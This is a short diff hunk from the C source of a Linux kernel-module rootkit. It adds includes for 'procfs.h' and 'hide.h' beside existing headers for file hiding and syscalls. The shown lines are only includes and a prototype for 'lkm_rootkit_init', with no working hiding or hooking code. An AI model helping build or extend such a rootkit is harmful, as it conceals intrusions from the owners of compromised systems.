@@ -4,6 +4,8 @@
 #include "common.h"
 #include "hidefs.h"
 #include "syscalls.h"
+#include "procfs.h"
+#include "hide.h"
 #include "misc.h"
 
 static int __init lkm_rootkit_init(void);
